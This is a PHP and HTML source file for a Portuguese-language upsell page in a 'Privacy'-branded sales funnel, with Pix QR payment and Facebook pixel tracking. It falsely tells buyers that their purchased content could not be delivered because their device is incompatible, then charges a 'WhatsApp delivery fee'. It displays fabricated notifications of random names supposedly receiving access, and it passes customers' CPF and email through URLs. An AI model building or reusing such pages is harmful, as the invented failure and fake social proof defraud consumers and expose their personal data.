<?php
// Obrigado/index.php - PÁGINA DO PRIMEIRO UPSELL (R$ 12,90) COM GERAÇÃO DE PIX NA TELA

// Dados da compra ANTERIOR para o Pixel do Facebook
$prev_tid = htmlspecialchars($_GET['prev_tid'] ?? 'N/A');
$prev_amount = floatval($_GET['prev_amount'] ?? 0.0);
$prev_name = htmlspecialchars(urldecode($_GET['prev_name'] ?? 'Produto Anterior'));

// Dados REAIS do CLIENTE, recebidos da compra anterior. Serão usados para o pagamento do upsell.
$customer_name = htmlspecialchars(urldecode($_GET['name'] ?? 'Teste Nome'));
$customer_email = htmlspecialchars(urldecode($_GET['email'] ?? 'teste@teste.com'));
$customer_cpf = htmlspecialchars(urldecode($_GET['cpf'] ?? '13432030908')); // Usando os dados reais

// Dados deste produto de UPSELL
$upsell_product_name = "Taxa de envio do acesso pelo WhatsApp";
$upsell_amount = 5.90;

// URL para RECUSAR a oferta e ir para o próximo upsell
$next_upsell_url = "upsell2.php?name=".urlencode($customer_name)."&email=".urlencode($customer_email)."&cpf=".urlencode($customer_cpf);

// --- INTEGRAÇÃO FACEBOOK CAPI (PURCHASE) ---
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../FacebookCAPI.php';

if ($prev_tid !== 'N/A' && $prev_amount > 0) {
    if (isset($CONFIG_FACEBOOK)) {
        $fbCapi = new FacebookCAPI($CONFIG_FACEBOOK['PIXEL_ID'], $CONFIG_FACEBOOK['ACCESS_TOKEN']);
        $fbCapi->sendEvent('Purchase', [
            'email' => $customer_email,
            'name' => $customer_name,
            // 'phone' => ... (se tivesse)
        ], [
            'value' => $prev_amount,
            'currency' => 'BRL',
            'content_name' => $prev_name,
            'order_id' => $prev_tid
        ], null, $prev_tid); // Usa TID como event_id para deduplicação
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Oferta Especial | Privacy</title>
    
    <!-- Meta Pixel Code -->
    <script>
        !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '<?php echo $CONFIG_FACEBOOK['PIXEL_ID']; ?>');
        fbq('track', 'PageView');
        // Dispara o pixel da COMPRA INICIAL que trouxe o cliente até aqui (com deduplicação)
        fbq('track', 'Purchase', { 
            value: <?= json_encode($prev_amount) ?>, 
            currency: 'BRL', 
            content_name: <?= json_encode($prev_name) ?>, 
            order_id: <?= json_encode($prev_tid) ?> 
        }, { eventID: <?= json_encode($prev_tid) ?> }); 
    </script>
    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?php echo $CONFIG_FACEBOOK['PIXEL_ID']; ?>&ev=PageView&noscript=1"/></noscript>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background: #fdfdfd; color: #333; min-height: 100vh; padding: 20px; display: flex; flex-direction: column; align-items: center; background-image: radial-gradient(#0000000a 1px, transparent 1px); background-size: 20px 20px; }
        .container { max-width: 500px; width: 100%; text-align: center; }
        .logo { margin-bottom: 30px; }
        .logo img { height: 25px; }
        .thank-you { background: #fff; border-radius: 20px; padding: 30px; margin-bottom: 30px; box-shadow: 0 5px 25px rgba(0, 0, 0, 0.07); border: 1px solid #f0f0f0; }
        h1 { font-size: 26px; margin-bottom: 15px; color: #333; }
        h2 { font-size: 22px; margin-bottom: 10px; color: #333; }
        .highlight { color: #ff6a00; font-weight: 600; }
        p { font-size: 16px; line-height: 1.6; margin-bottom: 15px; color: #555; }
        .device-info { background: #fff8f0; border-radius: 15px; padding: 20px; margin: 25px 0; border: 1px solid #ffe8d1; border-left: 4px solid #ff6a00; }
        .device-icon { font-size: 24px; margin-bottom: 10px; color: #ff6a00; }
        .offer { background: #fff8f0; border-radius: 20px; padding: 30px; margin: 30px 0; border: 2px solid #ff9d57; position: relative; overflow: hidden; }
        .offer-tag { position: absolute; top: -1px; right: -1px; background: #ff6a00; color: white; padding: 40px 40px 10px 10px; font-size: 11px; font-weight: 700; clip-path: polygon(100% 0, 100% 100%, 0 0); transform: rotate(45deg) translate(28px, -45px); transform-origin: top right; }
        .offer-tag span { display: block; transform: rotate(-45deg); }
        .price { font-size: 42px; font-weight: 700; margin: 15px 0; color: #ff6a00; }
        .unique { font-size: 18px; font-weight: 700; color: #ff6a00; margin: 10px 0; text-transform: uppercase; letter-spacing: 1px; background: white; display: inline-block; padding: 8px 20px; border-radius: 50px; border: 2px dashed #ffb58a; }
        .btn-container { margin: 20px 0; }
        .pulse-btn { display: block; background: linear-gradient(135deg, #ff9500 0%, #ff6a00 100%); color: white; border: none; border-radius: 12px; padding: 20px; font-size: 20px; font-weight: 700; cursor: pointer; width: 100%; transition: all 0.3s ease; box-shadow: 0 10px 20px rgba(255, 106, 0, 0.2); text-decoration: none; animation: pulse 2s infinite; }
        .pulse-btn:disabled { background: #ccc; animation: none; cursor: not-allowed; }
        @keyframes pulse { 0% { box-shadow: 0 10px 20px rgba(255, 106, 0, 0.2); } 70% { box-shadow: 0 10px 20px 15px rgba(255, 106, 0, 0); } 100% { box-shadow: 0 10px 20px rgba(255, 106, 0, 0.2); } }
        .security-icons { display: flex; justify-content: space-around; font-size: 13px; color: #777; margin: 20px 0; }
        .notifications { background: #fff; border-radius: 15px; padding: 20px; margin-top: 30px; width: 100%; border: 1px solid #f0f0f0; box-shadow: 0 5px 25px rgba(0, 0, 0, 0.05); }
        .notification-title { font-size: 16px; margin-bottom: 15px; color: #333; display: flex; align-items: center; justify-content: center; gap: 10px; font-weight: 600; }
        .notification-list { list-style: none; }
        .notification-item { padding: 12px; margin-bottom: 10px; background: #fdfdfd; border-radius: 10px; display: flex; align-items: center; border: 1px solid #f5f5f5; }
        .notification-icon { background: #fff0e0; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; color: #ff6a00; }
        .footer { margin-top: 30px; font-size: 12px; color: #aaa; text-align: center; padding-top: 20px; border-top: 1px solid #eee; width: 100%; }
        .payment-icons { display: flex; justify-content: center; gap: 15px; margin-top: 10px; filter: grayscale(100%); opacity: 0.6; font-size: 20px; }
        /* Estilos para a seção de pagamento */
        .payment-area { padding: 25px; text-align: center; background: #fff; border-radius: 20px; box-shadow: 0 5px 25px rgba(0, 0, 0, 0.07); }
        .qr-box { background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
        .qr-frame { display: flex; justify-content: center; align-items: center; min-height: 200px; }
        .copy-field { background: #f8f9fa; border: 1px solid #e0e0e0; border-radius: 8px; padding: 12px; font-family: monospace; font-size: 12px; word-break: break-all; margin-bottom: 15px; width: 100%; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; border-radius: 8px; font-weight: 700; font-size: 14px; cursor: pointer; border: 1px solid #ff6a00; display: flex; justify-content: center; align-items: center; gap: 8px; margin-bottom: 15px; transition: background 0.2s; }
        .btn-primary { background: #ff6a00; color: white; }
        .btn-secondary { background: white; color: #ff6a00; }
        .btn-secondary .spinner { animation: spin 1s linear infinite; } @keyframes spin{to{transform:rotate(360deg)}}
        .paid-section { display: none; color: #16a34a; }
        .paid-icon { font-size: 48px; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        
        <!-- SEÇÃO DA OFERTA (VISÍVEL INICIALMENTE) -->
        <div id="offer-section">
            <div class="thank-you">
                <h1>Muito obrigado por adquirir nossos pacotes!</h1>
                <p>Infelizmente, <span class="highlight">não foi possível fazer o envio dos conteúdos</span> pois seu dispositivo não é compatível com a versão atual.</p>
                <div class="device-info">
                    <div class="device-icon">📱</div>
                    <p>Dispositivo detectado: <span class="highlight" id="device-info">Dispositivo Móvel</span></p>
                </div>
                <p>Para garantir que você tenha acesso ao conteúdo adquirido, oferecemos uma solução alternativa:</p>
            </div>
            <div class="offer">
                <div class="offer-tag"><span>OFERTA ESPECIAL</span></div>
                <h2><?= htmlspecialchars($upsell_product_name) ?></h2>
                <p>Iremos mandar o acesso diretamente para você</p>
                <div class="price">R$ <?= number_format($upsell_amount, 2, ',', '.') ?></div>
                <div class="unique">UMA ÚNICA VEZ</div>
                <p style="font-size:14px; margin-top:15px;">Sem mensalidades, sem renovação automática<br>🛡️ Pagamento 100% seguro via criptografia</p>
            </div>
            <div class="btn-container">
                <button type="button" class="pulse-btn" id="buy-upsell-btn">💬 Receber Agora</button>
                <a href="<?= $next_upsell_url ?>" style="font-size: 13px; color: #777; margin-top: 15px; display: block; text-decoration: none;">Não, obrigado.</a>
            </div>
        </div>

        <!-- SEÇÃO DO PAGAMENTO (ESCONDIDA INICIALMENTE) -->
        <div id="payment-section" style="display: none;">
            <div class="payment-area">
                <div id="pending-section">
                    <div class="qr-box">
                        <h2 class="title">Escaneie o QR Code</h2>
                        <div class="qr-frame"><div id="qrcode-container"></div></div>
                    </div>
                    <input type="text" id="pix-code-field" class="copy-field" readonly>
                    <button class="btn btn-primary" onclick="copyPix()">📋 COPIAR CÓDIGO PIX</button>
                    <button class="btn btn-secondary" id="status-button"><span class="spinner" style="margin-right:8px;"></span> AGUARDANDO PAGAMENTO...</button>
                </div>
                <div id="completed-section" class="paid-section">
                    <div class="paid-icon">✅</div>
                    <h1 class="title" style="color:#16a34a;">Pagamento Aprovado!</h1>
                    <p>Você será redirecionado para a próxima etapa.</p>
                </div>
            </div>
        </div>

        <div class="security-icons">
            <div><i class="fas fa-lock"></i> Pagamento Seguro</div>
            <div><i class="fas fa-shield-alt"></i> Dados Protegidos</div>
            <div><i class="fas fa-bolt"></i> Entrega Imediata</div>
        </div>
        
        <div class="notifications">
            <div class="notification-title">🔔 Receberam o acesso agora:</div>
            <ul class="notification-list" id="notification-list"></ul>
        </div>
        
        <div class="footer">
            <p>🔒 Sua transação é segura e protegida</p>
            <p>© 2025 Privacy. Todos os direitos reservados.</p>
            <div class="payment-icons"><i class="fab fa-cc-visa"></i><i class="fab fa-cc-mastercard"></i><i class="fab fa-cc-paypal"></i></div>
        </div>
    </div>
    
    <script>
        const buyButton = document.getElementById('buy-upsell-btn');
        const offerSection = document.getElementById('offer-section');
        const paymentSection = document.getElementById('payment-section');

        buyButton.addEventListener('click', async () => {
            buyButton.innerHTML = 'Gerando Pagamento...';
            buyButton.disabled = true;

            const formData = new FormData();
            formData.append('product_name', '<?= htmlspecialchars($upsell_product_name) ?>');
            formData.append('amount', '<?= $upsell_amount ?>');
            formData.append('name', '<?= $customer_name ?>');
            formData.append('email', '<?= $customer_email ?>');
            formData.append('cpf', '<?= $customer_cpf ?>');

            try {
                const response = await fetch('../create_payment.php', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();

                if (data.success) {
                    offerSection.style.display = 'none';
                    paymentSection.style.display = 'block';
                    new QRCode(document.getElementById("qrcode-container"), { text: data.qrCodeText, width: 200, height: 200 });
                    document.getElementById('pix-code-field').value = data.qrCodeText;
                    startStatusPolling(data.transactionId);
                } else {
                    alert('Erro: ' + data.error);
                    buyButton.innerHTML = '💬 Receber Agora';
                    buyButton.disabled = false;
                }
            } catch (error) {
                alert('Ocorreu um erro de comunicação. Tente novamente.');
                buyButton.innerHTML = '💬 Receber Agora';
                buyButton.disabled = false;
            }
        });

        function copyPix() {
            const pixCodeField = document.getElementById('pix-code-field');
            navigator.clipboard.writeText(pixCodeField.value).then(() => alert('Código PIX copiado!'));
        }

        function startStatusPolling(transactionId) {
            const statusInterval = setInterval(async () => {
                try {
                    const response = await fetch(`../pagamento/check_status.php?tid=${transactionId}`);
                    const data = await response.json();
                    if (data && data.status === 'COMPLETED') {
                        clearInterval(statusInterval);
                        document.getElementById('pending-section').style.display = 'none';
                        document.getElementById('completed-section').style.display = 'block';
                        setTimeout(() => { window.location.href = '<?= $next_upsell_url ?>'; }, 3000);
                    }
                } catch (error) { console.error('Erro ao verificar status:', error); }
            }, 5000);
        }

        // --- Funções visuais (notificações, etc) ---
        function detectDevice() {
            const userAgent = navigator.userAgent;
            let device = "Dispositivo Móvel";
            if (/Android/i.test(userAgent)) { device = "Smartphone Android"; }
            else if (/iPhone|iPad|iPod/i.test(userAgent)) { device = "iPhone ou iPad (iOS)"; }
            document.getElementById("device-info").textContent = device;
        }
        function generatePageNotifications() {
            const list = document.getElementById("notification-list");
            const names = ["João", "Felipe", "Eduardo", "Pedro", "Thiago", "Carlos", "Rafael", "Mateus"];
            const shuffled = names.sort(() => 0.5 - Math.random());
            list.innerHTML = "";
            for (let i = 0; i < 5; i++) {
                const time = Math.floor(Math.random() * 10) + 1;
                list.innerHTML += `<li class="notification-item"><div class="notification-icon">💬</div><div><strong>${shuffled[i]}</strong> recebeu no WhatsApp<div style="font-size:12px;color:#888;">Há ${time} minutos</div></div></li>`;
            }
        }
        document.addEventListener("DOMContentLoaded", function() {
            detectDevice();
            generatePageNotifications();
            setInterval(generatePageNotifications, 10000);
        });
    </script>
</body>
</html>